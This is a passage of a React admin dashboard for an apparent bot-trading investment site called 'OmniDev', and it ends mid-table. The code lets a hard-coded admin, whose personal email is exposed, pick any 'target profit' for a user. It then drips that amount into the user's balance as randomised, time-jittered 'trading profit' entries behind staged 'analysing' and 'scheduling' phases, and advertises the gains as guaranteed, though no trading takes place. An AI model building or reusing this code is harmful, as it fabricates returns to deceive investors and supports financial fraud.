import { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { onAuthStateChanged } from "firebase/auth";
import { auth, db } from "../firebase";
import {
  collection,
  getDocs,
  doc,
  setDoc,
  updateDoc,
  query,
  orderBy,
  onSnapshot,
  Timestamp,
} from "firebase/firestore";

const ADMIN_EMAIL = "fiyinolaleke@gmail.com";

const fmt = (val) => {
  if (val === undefined || val === null) return "0.00";
  const n = typeof val === "number" ? val : parseFloat(val);
  if (isNaN(n) || Object.is(n, -0)) return "0.00";
  const s = n.toFixed(10),
    [int, dec] = s.split(".");
  return `${int.replace(/\B(?=(\d{3})+(?!\d))/g, ",")}.${dec.substring(0, 2)}`;
};

// ─── Generate scattered increment schedule ────────────────────────────────────
const generateIncrements = (target, totalHours) => {
  if (!target || target <= 0 || !totalHours || totalHours <= 0) return [];

  const totalMs = totalHours * 3600 * 1000;
  const chunks = [];
  let remaining = Math.round(target * 100) / 100;

  let sevenHundredCount = 0;

  while (remaining > 0.005) {
    let maxAllowed = Math.min(remaining, 700);

    // 700 can only appear twice
    if (sevenHundredCount >= 2) {
      maxAllowed = Math.min(maxAllowed, 699);
    }

    let chunk;
    const roll = Math.random();

    if (roll < 0.35) {
      // 35% chance → smaller numbers
      chunk = 50 + Math.random() * 150; // 50–200
    } else if (roll < 0.75) {
      // 40% chance → medium numbers
      chunk = 300 + Math.random() * 200; // 300–500
    } else {
      // 25% chance → larger numbers
      chunk = 600 + Math.random() * 100; // 600–700
    }

    chunk = Math.round(Math.min(chunk, maxAllowed));

    // Prevent tiny leftovers
    if (remaining - chunk < 50 && remaining - chunk > 0) {
      chunk = remaining;
    }

    if (chunk === 700) {
      sevenHundredCount++;
    }

    chunks.push(chunk);

    remaining = Math.round((remaining - chunk) * 100) / 100;
  }

  if (chunks.length === 0) return [];
  const n = chunks.length;

  const startBuffer = 2 * 60 * 1000;
  const endBuffer = totalMs - 2 * 60 * 1000;
  const usableMs = endBuffer - startBuffer;
  const slotSize = usableMs / n;

  const increments = chunks.map((amount, i) => {
    const slotStart = startBuffer + i * slotSize;
    const jitter = (Math.random() - 0.5) * slotSize * 0.4;
    const offsetMs = Math.round(
      Math.max(startBuffer, Math.min(endBuffer, slotStart + jitter)),
    );
    return { amount, offsetMs };
  });

  increments.sort((a, b) => a.offsetMs - b.offsetMs);

  for (let i = 1; i < increments.length; i++) {
    const minNext = increments[i - 1].offsetMs + 60000;
    if (increments[i].offsetMs < minNext) {
      increments[i].offsetMs = minNext;
    }
  }

  for (let i = increments.length - 1; i >= 0; i--) {
    const cap = endBuffer - (increments.length - 1 - i) * 60000;
    if (increments[i].offsetMs > cap) increments[i].offsetMs = cap;
  }

  return increments;
};

// ─── Chunk size validation ────────────────────────────────────────────────────
const validateChunkSizes = (schedule, target) => {
  if (!schedule.length) return { maxChunk: 0, total: 0, valid: true };
  const maxChunk = Math.max(...schedule.map((s) => s.amount), 0);
  const total = schedule.reduce((s, d) => s + d.amount, 0);
  console.log(
    `[CHUNK CHECK] target: $${fmt(target)}, chunks: ${schedule.length}, max: $${fmt(maxChunk)}, total: $${fmt(total)}`,
  );
  return { maxChunk, total, valid: maxChunk <= 700 };
};

// ─── Format duration helper ───────────────────────────────────────────────────
const fmtDuration = (ms) => {
  if (!ms || ms <= 0) return "0m";
  const m = Math.floor(ms / 60000);
  const h = Math.floor(m / 60);
  const mins = m % 60;
  if (h > 0 && mins > 0) return `${h}h ${mins}m`;
  if (h > 0) return `${h}h`;
  return `${mins}m`;
};

// ─── Color map for statuses (shared by type and status badges) ────────────────
const STATUS_COLORS = {
  analysing: {
    bg: "rgba(13,148,136,.15)",
    text: "#0d9488",
    label: "OmniDev Analysing",
  },
  scheduled: {
    bg: "rgba(245,158,11,.15)",
    text: "#f59e0b",
    label: "Scheduled",
  },
  trading: {
    bg: "rgba(34,197,94,.15)",
    text: "#22c55e",
    label: "Bot Trading Active",
  },
  disabled: {
    bg: "rgba(239,68,68,.15)",
    text: "#ef4444",
    label: "Bot Trading Disabled",
  },
  completed: {
    bg: "rgba(13,148,136,.15)",
    text: "#0d9488",
    label: "Completed",
  },
};

export default function AdminDashboard() {
  const [adminUser, setAdminUser] = useState(null);
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [fundSel, setFundSel] = useState(null);
  const [tgtSel, setTgtSel] = useState(null);
  const [fundAmt, setFundAmt] = useState("");
  const [anaHrs, setAnaHrs] = useState("0");
  const [anaMins, setAnaMins] = useState("45");
  const [fundLoading, setFundLoading] = useState(false);
  const [fundOk, setFundOk] = useState("");
  const [fundErr, setFundErr] = useState("");
  const [tgtAmt, setTgtAmt] = useState("");
  const [botHrs, setBotHrs] = useState("1");
  const [tgtLoading, setTgtLoading] = useState(false);
  const [tgtOk, setTgtOk] = useState("");
  const [tgtErr, setTgtErr] = useState("");
  const [txns, setTxns] = useState([]);
  const navigate = useNavigate();
  const processingRef = useRef(new Set());

  // ── Auth ────────────────────────────────────────────────────────────────────
  useEffect(() => {
    const unsub = onAuthStateChanged(auth, (user) => {
      if (!user || user.email !== ADMIN_EMAIL) {
        navigate("/");
        return;
      }
      setAdminUser(user);
      setLoading(false);
    });
    return () => unsub();
  }, [navigate]);

  // ── Real-time users ─────────────────────────────────────────────────────────
  useEffect(() => {
    if (!adminUser) return;
    const unsub = onSnapshot(collection(db, "users"), async (snap) => {
      const profSnap = await getDocs(collection(db, "profiles"));
      const profMap = {};
      profSnap.docs.forEach((d) => {
        profMap[d.id] = d.data();
      });
      const list = snap.docs.map((d) => {
        const data = d.data(),
          prof = profMap[d.id] || {};
        return {
          uid: d.id,
          email: data.email || "",
          firstName: data.firstName || "",
          lastName: data.lastName || "",
          username: prof.username || data.username || "",
          picture: prof.picture || null,
          balance: data.balance || 0,
          initialBalance: data.initialBalance || 0,
          botActive: data.botActive || false,
          botExpiresAt: data.botExpiresAt || null,
          analysingExpiresAt: data.analysingExpiresAt || null,
          scheduleActivateAt: data.scheduleActivateAt || null,
          botStatus: data.botStatus || "disabled",
          targetAmount: data.targetAmount || 0,
          botHours: data.botHours || 0,
          hasBeenFunded: data.hasBeenFunded || false,
          pendingTarget: data.pendingTarget || false,
          incrementSchedule: data.incrementSchedule || [],
          incrementScheduleStartMs: data.incrementScheduleStartMs || 0,
          incrementsApplied: data.incrementsApplied || 0,
        };
      });
      setUsers(list);
      setFundSel((p) => (p ? list.find((u) => u.uid === p.uid) || p : null));
      setTgtSel((p) => (p ? list.find((u) => u.uid === p.uid) || p : null));
    });
    return () => unsub();
  }, [adminUser]);

  // ── Real-time transactions ───────────────────────────────────────────────────
  useEffect(() => {
    if (!adminUser) return;
    const unsub = onSnapshot(
      query(collection(db, "adminTransactions"), orderBy("timestamp", "desc")),
      (snap) =>
        setTxns(
          snap.docs.map((d) => ({
            id: d.id,
            ...d.data(),
            timestamp: d.data().timestamp?.toDate?.() || new Date(),
          })),
        ),
    );
    return () => unsub();
  }, [adminUser]);

  // ── Client-side polling: activate pending bots + apply/flush increments ─────
  useEffect(() => {
    if (!adminUser || users.length === 0) return;
    const run = async () => {
      await checkAndActivatePendingBots();
      await applyAndFlushIncrements();
    };
    run();
    const interval = setInterval(run, 30 * 1000);
    return () => clearInterval(interval);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [adminUser, users]);

  // ── Activate pending bots ────────────────────────────────────────────────────
  const checkAndActivatePendingBots = async () => {
    const now = Date.now();
    for (const user of users) {
      if (!user.pendingTarget) continue;
      if (processingRef.current.has(`activate_${user.uid}`)) continue;

      const anaExpMs =
        user.analysingExpiresAt?.toMillis?.() || user.analysingExpiresAt || 0;
      if (now <= anaExpMs) continue;

      if (!user.scheduleActivateAt) {
        // System auto-schedules 2-5 minutes (random)
        const delayMs = (120 + Math.floor(Math.random() * 181)) * 1000;
        try {
          await updateDoc(doc(db, "users", user.uid), {
            scheduleActivateAt: Timestamp.fromMillis(now + delayMs),
            botStatus: "scheduled",
          });
        } catch (e) {
          console.error(e);
        }
        continue;
      }

      const activateAtMs =
        user.scheduleActivateAt?.toMillis?.() || user.scheduleActivateAt || 0;
      if (now < activateAtMs) continue;

      processingRef.current.add(`activate_${user.uid}`);
      try {
        const hours = user.botHours || 1;
        const target = user.targetAmount || 0;
        const nowTs = Timestamp.now();
        const botExpiresAt = Timestamp.fromMillis(now + hours * 3600 * 1000);
        const schedule = generateIncrements(target, hours);

        validateChunkSizes(schedule, target);

        await updateDoc(doc(db, "users", user.uid), {
          botStatus: "activated",
          botActive: true,
          botActivatedAt: nowTs,
          botExpiresAt,
          pendingTarget: false,
          scheduleActivateAt: null,
          incrementSchedule: schedule,
          incrementScheduleStartMs: now,
          incrementsApplied: 0,
        });

        const txnQuery = query(
          collection(db, "adminTransactions"),
          orderBy("timestamp", "desc"),
        );
        const txnSnap = await getDocs(txnQuery);
        const existingTxn = txnSnap.docs.find(
          (d) =>
            d.data().userId === user.uid && d.data().type === "bot_trading",
        );

        if (existingTxn) {
          await updateDoc(doc(db, "adminTransactions", existingTxn.id), {
            status: "trading",
            botExpiresAt,
            botActivatedAt: nowTs,
            note: "Auto-activated after analysing + scheduling gap",
            updatedAt: nowTs,
          });
        } else {
          await setDoc(doc(collection(db, "adminTransactions")), {
            userId: user.uid,
            userEmail: user.email,
            userName:
              `${user.firstName} ${user.lastName}`.trim() || user.username,
            type: "bot_trading",
            timestamp: nowTs,
            status: "trading",
            botExpiresAt,
            targetAmount: target,
            botHours: hours,
            initialAmount: user.initialBalance,
            adminEmail: adminUser.email,
            note: "Auto-activated after analysing + scheduling gap",
          });
        }
      } catch (err) {
        console.error("activate error:", err);
        processingRef.current.delete(`activate_${user.uid}`);
      }
    }
  };

  // ── Apply due increments + handle expiry ─────────────────────────────────────
  const applyAndFlushIncrements = async () => {
    const now = Date.now();
    for (const user of users) {
      if (user.botStatus !== "activated") continue;
      if (processingRef.current.has(`inc_${user.uid}`)) continue;

      const expMs = user.botExpiresAt?.toMillis?.() || user.botExpiresAt || 0;
      const schedule = user.incrementSchedule || [];
      const applied = user.incrementsApplied || 0;
      const startMs = user.incrementScheduleStartMs || 0;

      if (expMs > 0 && now >= expMs) {
        if (processingRef.current.has(`expire_${user.uid}`)) continue;
        processingRef.current.add(`expire_${user.uid}`);

        const remaining = schedule.slice(applied);

        try {
          const finalBalance = parseFloat(
            ((user.initialBalance || 0) + (user.targetAmount || 0)).toFixed(2),
          );

          await updateDoc(doc(db, "users", user.uid), {
            balance: finalBalance,
            incrementsApplied: schedule.length,
            botActive: false,
            botStatus: "disabled",
          });

          const txnQuery = query(
            collection(db, "adminTransactions"),
            orderBy("timestamp", "desc"),
          );
          const txnSnap = await getDocs(txnQuery);
          const existingTxn = txnSnap.docs.find(
            (d) =>
              d.data().userId === user.uid && d.data().type === "bot_trading",
          );

          if (existingTxn) {
            await updateDoc(doc(db, "adminTransactions", existingTxn.id), {
              status: "disabled",
              completedAt: Timestamp.now(),
              note: "Bot trading completed - time expired",
            });
          }

          if (remaining.length > 0) {
            const totalAdd = remaining.reduce((s, d) => s + d.amount, 0);
            for (const inc of remaining) {
              await setDoc(
                doc(collection(db, "users", user.uid, "transactions")),
                {
                  type: "bot_profit",
                  amount: inc.amount,
                  source: "bot_flush",
                  status: "completed",
                  timestamp: Timestamp.now(),
                  description: `OmniDev final balance adjustment +$${fmt(inc.amount)}`,
                },
              );
            }
            console.log(
              `[FLUSH] ${user.email}: micro-residual +$${fmt(totalAdd)}, final $${fmt(finalBalance)}`,
            );
          } else {
            console.log(
              `[EXPIRE] ${user.email}: clean expiry, final $${fmt(finalBalance)}`,
            );
          }
        } catch (err) {
          console.error("flush error:", err);
          processingRef.current.delete(`expire_${user.uid}`);
        }
        continue;
      }

      if (applied >= schedule.length) continue;
      const due = schedule
        .slice(applied)
        .filter((inc) => startMs + inc.offsetMs <= now);
      if (due.length === 0) continue;

      processingRef.current.add(`inc_${user.uid}`);
      try {
        const totalAdd = due.reduce((s, d) => s + d.amount, 0);
        const newBalance = Math.round((user.balance + totalAdd) * 100) / 100;

        await updateDoc(doc(db, "users", user.uid), {
          balance: newBalance,
          incrementsApplied: applied + due.length,
        });

        for (const inc of due) {
          await setDoc(doc(collection(db, "users", user.uid, "transactions")), {
            type: "bot_profit",
            amount: inc.amount,
            source: "bot",
            status: "completed",
            timestamp: Timestamp.now(),
            description: `OmniDev trading profit +$${fmt(inc.amount)}`,
          });
        }
        console.log(
          `[APPLY] ${user.email}: ${due.length} drops +$${fmt(totalAdd)}, bal $${fmt(newBalance)}`,
        );
      } catch (err) {
        console.error("increment error:", err);
      } finally {
        processingRef.current.delete(`inc_${user.uid}`);
      }
    }
  };

  // ── Fund user ────────────────────────────────────────────────────────────────
  const handleFund = async () => {
    const amount = parseFloat(fundAmt.trim());
    if (!fundSel || isNaN(amount) || amount <= 0) {
      setFundErr("Select a user and enter a valid amount.");
      return;
    }
    const now = Timestamp.now();
    const anaMs =
      (parseInt(anaHrs) || 0) * 3600000 + (parseInt(anaMins) || 0) * 60000;
    if (anaMs <= 0) {
      setFundErr("Set an analysis duration (at least 1 minute).");
      return;
    }
    const anaExp = Timestamp.fromMillis(now.toMillis() + anaMs);

    setFundLoading(true);
    setFundErr("");
    setFundOk("");
    try {
      await updateDoc(doc(db, "users", fundSel.uid), {
        balance: amount,
        initialBalance: amount,
        hasBeenFunded: true,
        botActive: true,
        botStatus: "analysing",
        targetAmount: 0,
        botHours: 0,
        botActivatedAt: now,
        botExpiresAt: null,
        analysingExpiresAt: anaExp,
        scheduleActivateAt: null,
        lastFundedAt: now,
        lastFundedAmount: amount,
        pendingTarget: false,
        incrementSchedule: [],
        incrementScheduleStartMs: 0,
        incrementsApplied: 0,
      });
      await setDoc(doc(collection(db, "adminTransactions")), {
        userId: fundSel.uid,
        userEmail: fundSel.email,
        userName:
          `${fundSel.firstName} ${fundSel.lastName}`.trim() || fundSel.username,
        amount,
        type: "initial_fund",
        timestamp: now,
        status: "analysing",
        adminEmail: adminUser.email,
        analysingExpiresAt: anaExp,
        analysingDurationMs: anaMs,
      });
      await setDoc(doc(collection(db, "users", fundSel.uid, "transactions")), {
        type: "deposit",
        amount,
        source: "admin",
        status: "completed",
        timestamp: now,
        description: `Initial deposit $${fmt(amount)}`,
      });
      setFundOk(
        `Funded $${fmt(amount)} to ${fundSel.email}. OmniDev is now analysing for ${fmtDuration(anaMs)}.`,
      );
      setFundAmt("");
      setFundSel(null);
      setTimeout(() => setFundOk(""), 6000);
    } catch (e) {
      console.error(e);
      setFundErr("Failed to fund. Try again.");
    } finally {
      setFundLoading(false);
    }
  };

  // ── Set target ───────────────────────────────────────────────────────────────
  const handleTarget = async () => {
    const target = parseFloat(tgtAmt.trim());
    const hours = parseInt(botHrs) || 1;
    if (!tgtSel) {
      setTgtErr("Select a user.");
      return;
    }
    if (!tgtSel.hasBeenFunded) {
      setTgtErr("Fund this user first.");
      return;
    }
    if (isNaN(target) || target <= 0) {
      setTgtErr("Enter a valid target amount.");
      return;
    }

    const now = Timestamp.now();
    const anaExpMs = tgtSel.analysingExpiresAt?.toMillis?.() || 0;
    const isAnalysing =
      !tgtSel.botExpiresAt &&
      (tgtSel.botStatus === "analysing" ||
        tgtSel.botStatus === "scheduled" ||
        (anaExpMs && Date.now() < anaExpMs));

    setTgtLoading(true);
    setTgtErr("");
    setTgtOk("");
    try {
      const userRef = doc(db, "users", tgtSel.uid);

      if (isAnalysing) {
        const schedule = generateIncrements(target, hours);
        validateChunkSizes(schedule, target);

        await updateDoc(userRef, {
          targetAmount: target,
          botHours: hours,
          pendingTarget: true,
          pendingTargetSetAt: now,
          botStatus:
            tgtSel.botStatus === "scheduled" ? "scheduled" : "analysing",
          incrementSchedule: [],
          incrementScheduleStartMs: 0,
          incrementsApplied: 0,
        });

        await setDoc(doc(collection(db, "adminTransactions")), {
          userId: tgtSel.uid,
          userEmail: tgtSel.email,
          userName:
            `${tgtSel.firstName} ${tgtSel.lastName}`.trim() || tgtSel.username,
          initialAmount: tgtSel.initialBalance,
          targetAmount: target,
          botHours: hours,
          type: "bot_trading",
          timestamp: now,
          status: "scheduled",
          adminEmail: adminUser.email,
          note: "Will auto-activate 2–5 mins after analysing completes",
        });

        setTgtOk(
          `Scheduled! $${fmt(tgtSel.initialBalance)} → $${fmt(tgtSel.initialBalance + target)} ` +
            `over ${hours}h. Bot activates after analysis finishes.`,
        );
      } else {
        const botExpiresAt = Timestamp.fromMillis(
          now.toMillis() + hours * 3600000,
        );
        const schedule = generateIncrements(target, hours);
        const chunkCheck = validateChunkSizes(schedule, target);
        if (!chunkCheck.valid)
          console.warn(
            `[CHUNK WARNING] Max chunk exceeded for ${tgtSel.email}`,
          );

        await updateDoc(userRef, {
          targetAmount: target,
          botActive: true,
          botStatus: "activated",
          botActivatedAt: now,
          botExpiresAt,
          botHours: hours,
          pendingTarget: false,
          scheduleActivateAt: null,
          lastTargetSetAt: now,
          incrementSchedule: schedule,
          incrementScheduleStartMs: now.toMillis(),
          incrementsApplied: 0,
        });

        await setDoc(doc(collection(db, "adminTransactions")), {
          userId: tgtSel.uid,
          userEmail: tgtSel.email,
          userName:
            `${tgtSel.firstName} ${tgtSel.lastName}`.trim() || tgtSel.username,
          initialAmount: tgtSel.initialBalance,
          targetAmount: target,
          botHours: hours,
          type: "bot_trading",
          timestamp: now,
          status: "trading",
          botExpiresAt,
          adminEmail: adminUser.email,
        });

        setTgtOk(
          `Bot activated! $${fmt(tgtSel.initialBalance)} → ` +
            `$${fmt(tgtSel.initialBalance + target)} over ${hours}h.`,
        );
      }
      setTgtAmt("");
      setBotHrs("1");
      setTgtSel(null);
      setTimeout(() => setTgtOk(""), 7000);
    } catch (e) {
      console.error(e);
      setTgtErr("Failed. Try again.");
    } finally {
      setTgtLoading(false);
    }
  };

  // ── Bot status display ───────────────────────────────────────────────────────
  const getBotStatus = (u) => {
    if (!u.hasBeenFunded)
      return { text: "Not Funded", color: "#6b7280", dot: "#6b7280" };
    const now = Date.now();
    const exp = u.botExpiresAt?.toMillis?.() || u.botExpiresAt;
    const ana = u.analysingExpiresAt?.toMillis?.() || u.analysingExpiresAt;
    const sch = u.scheduleActivateAt?.toMillis?.() || u.scheduleActivateAt;

    if (exp && now > exp)
      return { text: "Bot Trading Disabled", color: "#ef4444", dot: "#ef4444" };
    if (exp && now <= exp)
      return {
        text: "Bot Trading Activated",
        color: "#22c55e",
        dot: "#22c55e",
      };
    if (u.botStatus === "scheduled" || (sch && now <= sch))
      return {
        text: "Scheduling — Activating Soon",
        color: "#f59e0b",
        dot: "#f59e0b",
      };
    if (u.pendingTarget)
      return {
        text: "OmniDev Analysing Market",
        color: "#3b82f6",
        dot: "#3b82f6",
      };
    if (ana && now <= ana)
      return {
        text: "OmniDev Analysing Market",
        color: "#3b82f6",
        dot: "#3b82f6",
      };
    if (u.hasBeenFunded)
      return {
        text: "OmniDev Analysing Market",
        color: "#3b82f6",
        dot: "#3b82f6",
      };
    return { text: "Bot Trading Disabled", color: "#ef4444", dot: "#ef4444" };
  };

  // ── Transaction live status ──────────────────────────────────────────────────
  const getTxnStatus = (t) => {
    const now = Date.now();
    const live = users.find((u) => u.uid === t.userId);
    const liveSt = live?.botStatus || "disabled";

    if (t.type === "initial_fund") {
      if (liveSt === "disabled" || liveSt === "activated") return "completed";
      const anaExp = t.analysingExpiresAt?.toMillis?.() || t.analysingExpiresAt;
      if (anaExp && now < anaExp) return "analysing";
      return "completed";
    }

    if (t.type === "bot_trading") {
      if (t.status === "disabled") return "disabled";
      const exp = t.botExpiresAt?.toMillis?.() || t.botExpiresAt;
      if (exp && now >= exp) return "disabled";
      if (exp && now < exp) return "trading";
      if (liveSt === "activated") return "trading";
      if (liveSt === "scheduled") return "scheduled";
      if (liveSt === "disabled") return "disabled";
      return t.status || "scheduled";
    }

    if (liveSt === "disabled") return "completed";
    return t.status || "completed";
  };

  const fmtLeft = (ts) => {
    if (!ts) return "";
    const ms = (ts.toMillis?.() || ts) - Date.now();
    if (ms <= 0) return "Expired";
    const m = Math.floor(ms / 60000),
      h = Math.floor(m / 60);
    return h > 0 ? `${h}h ${m % 60}m` : `${m}m`;
  };

  const clearFund = () => {
    setFundSel(null);
    setFundAmt("");
    setFundErr("");
    setFundOk("");
  };
  const clearTgt = () => {
    setTgtSel(null);
    setTgtAmt("");
    setTgtErr("");
    setTgtOk("");
    setBotHrs("1");
  };

  if (loading)
    return (
      <div
        style={{
          minHeight: "100vh",
          background: "#0a0a0a",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          flexDirection: "column",
          gap: "16px",
        }}
      >
        <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
        <div
          style={{
            width: "40px",
            height: "40px",
            border: "3px solid #1a1a1a",
            borderTop: "3px solid #0d9488",
            borderRadius: "50%",
            animation: "spin 1s linear infinite",
          }}
        />
        <p style={{ color: "#9ca3af" }}>Loading admin panel...</p>
      </div>
    );

  const UserCard = ({ user }) => {
    const s = getBotStatus(user);
    return (
      <div className="user-card">
        <div className="user-card-header">
          <div className="user-avatar">
            {user.picture ? (
              <img src={user.picture} alt="" />
            ) : (
              (user.firstName?.[0] || user.email[0]).toUpperCase()
            )}
          </div>
          <div className="user-info">
            <p className="user-name">
              {user.firstName} {user.lastName}
            </p>
            <p className="user-handle">@{user.username || "no username"}</p>
          </div>
        </div>
        <span className="status-badge" style={{ color: s.color }}>
          <span className="status-dot" style={{ background: s.dot }} />
          {s.text}
        </span>
      </div>
    );
  };

  return (
    <div className="admin-dashboard">
      {/* Header */}
      <header className="admin-header">
        <div className="admin-header-left">
          <div className="admin-logo">
            <svg
              width="22"
              height="22"
              viewBox="0 0 24 24"
              fill="none"
              stroke="white"
              strokeWidth="2"
            >
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            </svg>
          </div>
          <div>
            <h1 className="admin-title">Admin Dashboard</h1>
            <p className="admin-email">{adminUser?.email}</p>
          </div>
        </div>
        <button className="btn-back" onClick={() => navigate("/dashboard")}>
          Back to Site
        </button>
      </header>

      {users.some((u) => u.pendingTarget) && (
        <div className="alert-banner">
          🟡 {users.filter((u) => u.pendingTarget).length} user(s) scheduled —
          will auto-activate after analysis + scheduling gap.
        </div>
      )}

      <div className="admin-grid">
        {/* ── STEP 1: Fund ── */}
        <div className="card">
          <div className="card-header">
            <span className="card-badge" style={{ background: "#0d9488" }}>
              1
            </span>
            <h2 className="card-title">Fund User Account</h2>
          </div>

          <div className="form-group">
            <label className="form-label">Select User</label>
            <select
              className="form-select"
              value={fundSel?.uid || ""}
              onChange={(e) => {
                setFundSel(users.find((u) => u.uid === e.target.value) || null);
                setFundErr("");
              }}
            >
              <option value="">Choose a user...</option>
              {users.map((u) => (
                <option key={u.uid} value={u.uid}>
                  {u.email} — ${fmt(u.balance)}{" "}
                  {u.hasBeenFunded ? "(Funded)" : "(New)"}
                </option>
              ))}
            </select>
          </div>

          {fundSel && <UserCard user={fundSel} />}

          <div className="form-group">
            <label className="form-label">Deposit Amount (USD)</label>
            <input
              className="form-input"
              type="number"
              min="0.01"
              step="any"
              placeholder="e.g. 150"
              value={fundAmt}
              onChange={(e) => {
                setFundAmt(e.target.value);
                setFundErr("");
              }}
            />
          </div>

          <div className="form-group">
            <label className="form-label">OmniDev Analysis Duration</label>
            <div className="input-row">
              <select
                className="form-select"
                value={anaHrs}
                onChange={(e) => setAnaHrs(e.target.value)}
              >
                {Array.from({ length: 24 }, (_, i) => (
                  <option key={i} value={i}>
                    {i} hr{i !== 1 ? "s" : ""}
                  </option>
                ))}
              </select>
              <select
                className="form-select"
                value={anaMins}
                onChange={(e) => setAnaMins(e.target.value)}
              >
                {[0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55].map((m) => (
                  <option key={m} value={m}>
                    {m} min{m !== 1 ? "s" : ""}
                  </option>
                ))}
              </select>
            </div>
            <p className="form-hint">
              After this + 2–5 min gap, bot trading begins.
            </p>
          </div>

          {fundErr && <div className="alert alert-error">{fundErr}</div>}
          {fundOk && <div className="alert alert-success">{fundOk}</div>}

          <div className="btn-group">
            <button
              className="btn-primary"
              onClick={handleFund}
              disabled={fundLoading || !fundSel}
            >
              {fundLoading ? (
                <>
                  <span className="spinner" /> Processing...
                </>
              ) : (
                "Fund Account"
              )}
            </button>
            <button className="btn-secondary" onClick={clearFund}>
              Cancel
            </button>
          </div>
        </div>

        {/* ── STEP 2: Target ── */}
        <div className="card">
          <div className="card-header">
            <span className="card-badge" style={{ background: "#065f46" }}>
              2
            </span>
            <h2 className="card-title">Set Target &amp; Activate Bot</h2>
          </div>

          <div className="form-group">
            <label className="form-label">Select Funded User</label>
            <select
              className="form-select"
              value={tgtSel?.uid || ""}
              onChange={(e) => {
                setTgtSel(users.find((u) => u.uid === e.target.value) || null);
                setTgtErr("");
              }}
            >
              <option value="">Choose a funded user...</option>
              {users
                .filter((u) => u.hasBeenFunded)
                .map((u) => (
                  <option key={u.uid} value={u.uid}>
                    {u.email} — ${fmt(u.balance)}{" "}
                    {u.botStatus === "activated"
                      ? "(Trading)"
                      : u.botStatus === "scheduled"
                        ? "(Scheduling)"
                        : u.botStatus === "analysing"
                          ? "(Analysing)"
                          : "(Ready)"}
                  </option>
                ))}
            </select>
          </div>

          {tgtSel?.hasBeenFunded && (
            <div className="info-box">
              <p className="info-row">
                Balance: <strong>${fmt(tgtSel.balance)}</strong>
              </p>
              <p className="info-row">
                Initial Deposit: <strong>${fmt(tgtSel.initialBalance)}</strong>
              </p>
              <p className="info-row">
                Status:{" "}
                <strong
                  style={{
                    color:
                      tgtSel.botStatus === "activated"
                        ? "#22c55e"
                        : tgtSel.botStatus === "scheduled"
                          ? "#f59e0b"
                          : tgtSel.botStatus === "analysing"
                            ? "#3b82f6"
                            : "#ef4444",
                  }}
                >
                  {tgtSel.botStatus === "activated"
                    ? "Bot Trading Active"
                    : tgtSel.botStatus === "scheduled"
                      ? "Scheduling Soon"
                      : tgtSel.botStatus === "analysing"
                        ? "OmniDev Analysing"
                        : "Disabled"}
                </strong>
              </p>
              {tgtSel.analysingExpiresAt && (
                <p className="info-sub">
                  Analysing ends in: {fmtLeft(tgtSel.analysingExpiresAt)}
                </p>
              )}
            </div>
          )}

          <div className="form-group">
            <label className="form-label">Target Profit Amount (USD)</label>
            <input
              className="form-input"
              type="number"
              min="0.01"
              step="any"
              placeholder="e.g. 2000"
              value={tgtAmt}
              onChange={(e) => {
                setTgtAmt(e.target.value);
                setTgtErr("");
              }}
            />
          </div>

          <div className="form-group">
            <label className="form-label">
              Bot Trading Duration{" "}
              <span style={{ color: "#22c55e" }}>
                (how long the bot trades)
              </span>
            </label>
            <select
              className="form-select"
              value={botHrs}
              onChange={(e) => setBotHrs(e.target.value)}
            >
              {[1, 2, 3, 4, 5, 6, 7, 8, 12, 24, 48, 72].map((h) => (
                <option key={h} value={h}>
                  {h} hour{h > 1 ? "s" : ""}
                </option>
              ))}
            </select>
          </div>

          {tgtSel?.hasBeenFunded && tgtAmt && parseFloat(tgtAmt) > 0 && (
            <div className="preview-box">
              <p className="preview-title">📈 Growth Preview</p>
              <p className="preview-text">
                ${fmt(tgtSel.initialBalance)} → $
                {fmt(tgtSel.initialBalance + parseFloat(tgtAmt))} over {botHrs}h
                <br />
                <span className="preview-sub">
                  = ${fmt(tgtSel.initialBalance)} initial + $
                  {fmt(parseFloat(tgtAmt))} profit (scattered drops, all
                  guaranteed)
                </span>
              </p>
            </div>
          )}

          {tgtErr && <div className="alert alert-error">{tgtErr}</div>}
          {tgtOk && <div className="alert alert-success">{tgtOk}</div>}

          <div className="btn-group">
            <button
              className="btn-primary"
              onClick={handleTarget}
              disabled={tgtLoading || !tgtSel?.hasBeenFunded}
            >
              {tgtLoading ? (
                <>
                  <span className="spinner" /> Processing...
                </>
              ) : (
                "Set Target & Activate Bot"
              )}
            </button>
            <button className="btn-secondary" onClick={clearTgt}>
              Cancel
            </button>
          </div>
        </div>

        {/* ── All Users table ── */}
        <div className="card admin-grid-full">
          <h2 className="card-title" style={{ margin: "0 0 14px" }}>
            👥 All Users ({users.length})
          </h2>
          <div className="table-wrap table-scroll">
            <table className="admin-table">
              <thead>
                <tr>
                  {["User", "Balance", "Target", "Status", "Time Left"].map(
                    (h) => (
                      <th key={h}>{h}</th>
                    ),
                  )}
                </tr>
              </thead>
              <tbody>
                {users.length === 0 ? (
                  <tr>
                    <td colSpan={5} className="table-empty">
                      No users found.
                    </td>
                  </tr>
                ) : (
                  users.map((u) => {
                    const s = getBotStatus(u);
                    return (
                      <tr
                        key={u.uid}
                        onClick={() => {
                          setFundSel(u);
                          if (u.hasBeenFunded) setTgtSel(u);
                        }}
                      >
                        <td>
                          <div className="table-user">
                            <div className="table-avatar">
                              {u.picture ? (
                                <img src={u.picture} alt="" />
                              ) : (
                                (u.firstName?.[0] || u.email[0]).toUpperCase()
                              )}
                            </div>
                            <div className="table-user-info">
                              <p className="table-user-email">{u.email}</p>
                              <p className="table-user-handle">
                                @{u.username || "—"}
                              </p>
                            </div>
                          </div>
                        </td>
                        <td className="amount">${fmt(u.balance)}</td>
                        <td className="amount">
                          {u.targetAmount > 0 ? `$${fmt(u.targetAmount)}` : "—"}
                        </td>
                        <td>
                          <span
                            className="table-status"
                            style={{ color: s.color }}
                          >
                            <span
                              className="table-status-dot"
                              style={{ background: s.dot }}
                            />
                            {s.text}
                          </span>
                        </td>
                        <td className="time-left">
                          {u.botExpiresAt
                            ? fmtLeft(u.botExpiresAt)
                            : u.scheduleActivateAt
                              ? `~${fmtLeft(u.scheduleActivateAt)}`
                              : u.analysingExpiresAt
                                ? fmtLeft(u.analysingExpiresAt)
                                : "—"}
                        </td>
